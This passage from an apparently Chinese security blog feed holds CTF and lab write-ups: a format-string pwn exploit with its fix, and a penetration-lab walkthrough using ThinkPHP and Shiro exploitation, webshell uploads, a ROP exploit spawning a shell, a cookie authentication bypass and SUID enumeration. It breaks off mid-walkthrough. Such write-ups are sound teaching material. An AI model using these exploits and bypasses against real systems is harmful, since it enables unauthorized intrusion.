class="hljs-number">4</span>+<span class="hljs-number">10</span>-<span class="hljs-number">0x30</span>)&amp;<span class="hljs-number">0xff</span><br>    data=data+<span class="hljs-number">0x100</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">10</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hhn&#x27;</span><br>    <br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(print_stack))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>    p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>    pause()<br><br>    print_stack-=<span class="hljs-number">0x30</span><br>    data=gadget&amp;<span class="hljs-number">0xffff</span><br>    subdata=<span class="hljs-number">20</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">20</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&quot;c&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br><br>    data=print_stack+<span class="hljs-number">2</span><br>    subdata=(gadget+<span class="hljs-number">5</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&quot;c&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br><br>    data=(gadget&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br>    subdata=(print_stack+<span class="hljs-number">2</span>+<span class="hljs-number">26</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br><br>    payload+=<span class="hljs-string">&quot;%c&quot;</span>*<span class="hljs-number">26</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br><br>    data=(gadget&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span><br>    subdata=(gadget&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br>    data=data+<span class="hljs-number">0x10000</span>-subdata<br>    payload+=<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(data)+<span class="hljs-string">&quot;c&quot;</span>+<span class="hljs-string">&quot;%hn&quot;</span><br>    <span class="hljs-built_in">print</span>(payload)<br>    info(<span class="hljs-string">&quot;thrid&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>    p.interactive()<br><span class="hljs-comment">#    pause()</span><br><br>p=process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br>pwn(p)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p=remote(&quot;10.1.123.23&quot;,9999)</span><br>        p=process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br>        gdb.attach(p,<span class="hljs-string">&#x27;bp $rebase(0x1635)&#x27;</span>)<br>        pwn(p)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="fix-7"><a href="#fix-7" class="headerlink" title="fix"></a>fix</h2><p>在输出时使用了printf函数，修改为使用puts函数进行输出</p><p><img src="/img/wp/2024/2024ciscn-printf-master-FIX_1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1签到+4web+4pwn&lt;/p&gt;
&lt;h1 id=&quot;web-welcome&quot;&gt;&lt;a href=&quot;#web-welcome&quot; class=&quot;headerlink&quot; title=&quot;web-welcome&quot;&gt;&lt;/a&gt;web-welcome&lt;/h1&gt;&lt;p&gt;签到，Ctrl+U&lt;/p&gt;</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="awdp" scheme="https://www.dr0n.top/tags/awdp/"/>
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="ciscn" scheme="https://www.dr0n.top/tags/ciscn/"/>
    
    <category term="2024竞赛" scheme="https://www.dr0n.top/tags/2024%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>春秋云境 GreatWall(第一届长城杯半决赛渗透题)</title>
    <link href="https://www.dr0n.top/posts/f249db01/"/>
    <id>https://www.dr0n.top/posts/f249db01/</id>
    <published>2024-06-10T12:00:00.000Z</published>
    <updated>2025-07-27T09:29:27.280Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-172-28-23-17"><a href="#ThinkPHP-172-28-23-17" class="headerlink" title="ThinkPHP (172.28.23.17)"></a>ThinkPHP (172.28.23.17)</h1><p>先扫描端口，发现开放了两个web服务</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-1.png"></p><p>8080是一个后台登录框，版本是<code>ThinkPHP V5.0.23</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-2.png"></p><p>直接用tp5的nday打</p><p>写入shell后根目录有<code>flag1</code></p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-3.png"></p><p>然后上传fscan开始扫内网</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:04:4a:03 brd ff:ff:ff:ff:ff:ff<br>    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0<br>       valid_lft 315357428sec preferred_lft 315357428sec<br>    inet6 fe80::216:3eff:fe04:4a03/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>发现存活主机如下</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.28.23.26</span><br><span class="hljs-number">172.28.23.33</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-4.png"></p><h1 id="第一层内网"><a href="#第一层内网" class="headerlink" title="第一层内网"></a>第一层内网</h1><h2 id="建立代理"><a href="#建立代理" class="headerlink" title="建立代理"></a>建立代理</h2><p>通过Neo-reGeorg上传一个tunnel.php</p><p>然后本地建立连接，转发到本地的6666端口</p><p><code>python neoreg.py -k dr0n1 -p 6666 -u http://8.130.36.152:8080/tunnel.php</code></p><p>然后使用proxifier或者SwitchyOmega等代理</p><h2 id="智联科技-ERP-172-28-23-33"><a href="#智联科技-ERP-172-28-23-33" class="headerlink" title="智联科技 ERP (172.28.23.33)"></a>智联科技 ERP (172.28.23.33)</h2><p>开放了8080端口，访问是 智联科技 ERP 后台登陆</p><p>扫下目录</p><p><code>python dirsearch.py -u http://172.28.23.33:8080/ --proxy socks5://127.0.0.1:6666</code></p><p>显然是Shiro框架+heapdump泄露</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-5.png"></p><p>使用<code>JDumpSpider</code>分析heapdump，拿到ShiroKey</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">===========================================<br>CookieRememberMeManager(ShiroKey)<br>-------------<br>algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES<br><br>===========================================<br></code></pre></td></tr></table></figure><p>注入内存马后连接shell</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-6.png"></p><p>没找到flag，用户是ops01，应该是要提权</p><p>在&#x2F;home&#x2F;ops01&#x2F;中有HashNote文件，开放了59696端口</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-24.png"></p><p>分析HashNote文件</p><p>首先调用了<code>sub_40501E()</code>进行身份验证，密码为<code>freep@ssw0rd:3</code></p><p>选项1调用了<code>sub_404924()</code></p><p>输入key后调用了<code>sub_40482C()</code>，生成hash作为索引，返回的范围是0-126</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-26.png"></p><p>因为在重复判断时没有对索引进行验证，存在数组越界</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-25.png"></p><p>选项2调用了<code>sub_404B7A()</code></p><p>与1同样，没有对索引验证，可以构造data，实现任意地址读</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-27.png"></p><p>选项3调用了<code>sub_404D2D()</code></p><p>与2一样，输出变成了写入，可以任意地址写</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-28.png"></p><p>因为username的地址在数组之后，所以越界后数组可以索引到username</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-29.png"></p><p>先构造两个同样hash不同key的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">key,data=<span class="hljs-string">&#x27;b&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">1</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后再username中伪造数据，获取栈的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">username=<span class="hljs-number">0x5dc980</span><br>stack=<span class="hljs-number">0x5e4fa8</span><br>ukey=<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x10</span>,<br>    <span class="hljs-number">0x10</span>:[username+<span class="hljs-number">0x20</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>:[stack,<span class="hljs-number">0x10</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拿到地址后就可以向栈中写入rop链</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">key,data=<span class="hljs-string">&#x27;b&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">key</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Key: &quot;</span>,key);<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">key,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">username</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,username)<br><br><br>p = remote(<span class="hljs-string">&#x27;172.28.23.33&#x27;</span>, <span class="hljs-number">59696</span>)<br><span class="hljs-comment"># p = process(&#x27;./HashNote&#x27;)</span><br><br><br>username=<span class="hljs-number">0x5dc980</span><br>stack=<span class="hljs-number">0x5e4fa8</span><br>ukey=<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x10</span>,<br>    <span class="hljs-number">0x10</span>:[username+<span class="hljs-number">0x20</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>:[stack,<span class="hljs-number">0x10</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;name&#x27;</span>,fake_chunk)<br>p.sendlineafter(<span class="hljs-string">b&#x27;word&#x27;</span>,<span class="hljs-string">&#x27;freep@ssw0rd:3&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">1</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)   <span class="hljs-comment"># 126</span><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)   <span class="hljs-comment"># 127</span><br><br><br>show(ukey)<br>main_ret=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x1e0</span><br><br><br><br><br>rdi=<span class="hljs-number">0x0000000000405e7c</span> <span class="hljs-comment"># pop rdi ; ret</span><br>rsi=<span class="hljs-number">0x000000000040974f</span> <span class="hljs-comment"># pop rsi ; ret</span><br>rdx=<span class="hljs-number">0x000000000053514b</span> <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>rax=<span class="hljs-number">0x00000000004206ba</span> <span class="hljs-comment"># pop rax ; ret</span><br>syscall=<span class="hljs-number">0x00000000004560c6</span> <span class="hljs-comment"># syscall</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0x20</span>:[username+<span class="hljs-number">0x30</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x40</span>:[main_ret,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>name(fake_chunk.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>payload=flat([<br>    rdi,username+<span class="hljs-number">0x50</span>,<br>    rsi,<span class="hljs-number">0</span>,<br>    rdx,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    rax,<span class="hljs-number">0x3b</span>,<br>    syscall<br>    ])<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,ukey)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;9&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>在<code>/root/flag_RaYz1/f1ag03.txt</code>拿到flag3</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-7.png"></p><p>有两张网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:03:cb:48 brd ff:ff:ff:ff:ff:ff<br>    inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0<br>       valid_lft 315357178sec preferred_lft 315357178sec<br>    inet6 fe80::216:3eff:fe03:cb48/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:16:3e:03:97:b8 brd ff:ff:ff:ff:ff:ff<br>    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::216:3eff:fe03:97b8/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>将fscan传到172.28.23.17后wget下载</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-22.png"></p><p>172.22.10.1&#x2F;24 网段存活如下</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.10.28</span><br></code></pre></td></tr></table></figure><h2 id="新翔OA-172-28-23-26"><a href="#新翔OA-172-28-23-26" class="headerlink" title="新翔OA (172.28.23.26)"></a>新翔OA (172.28.23.26)</h2><p>在之前的扫描结果中看到开放了21端口，匿名用户可以登录</p><p>下载oa源码</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-8.png"></p><p>开始审计代码</p><p>从<code>main.php</code>开始，开头引入了<code>db.php</code>和<code>checklogin.php</code></p><p>抽象的鉴权</p><p>checklogin.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">islogin</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;id&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;loginname&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;jueseid&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;danweiid&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;quanxian&#x27;</span>]))&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;id&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;loginname&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;jueseid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;danweiid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>&amp;&amp;<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;quanxian&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>     &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>Cookie: id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1</code> 直接登录</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-9.png"></p><p>登进去后好像没什么用，后台写的很简陋，没有功能点</p><p>在源码根目录下还有一个<code>uploadbase64.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Description: PhpStorm.</span><br><span class="hljs-comment"> * Author: yoby</span><br><span class="hljs-comment"> * DateTime: 2018/12/4 18:01</span><br><span class="hljs-comment"> * Email:logove<span class="hljs-doctag">@qq</span>.com</span><br><span class="hljs-comment"> * Copyright Yoby版权所有</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">$img</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;imgbase64&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w+);base64,)/&#x27;</span>, <span class="hljs-variable">$img</span>, <span class="hljs-variable">$result</span>)) &#123;<br>    <span class="hljs-variable">$type</span> = <span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d&quot;</span>) . <span class="hljs-string">&quot;-&quot;</span> . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$type</span>;<br>&#125;<br><span class="hljs-variable">$img</span> =  <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>));<br>@<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$img</span>);<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;src&quot;:&quot;&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>对于上传的校验不完整，只要符合格式是<code>data:image/xxx;base64,xxx</code>这种就行了</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-10.png"></p><p>连上shell后发现有很多disable_functions</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl<br></code></pre></td></tr></table></figure><p>用蚁剑自带的插件绕过即可</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/GreatWall-11.png"></p><p>不过连接前需要修改下<code>.antproxy.php</code>中的<code>$url</code>，加一个<code>/upload</code></p><p>然后就可以执行命令来提权了</p><p>执行<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，发现<code>base32</code>有suid权限，可以利用</p><figure class="highlight 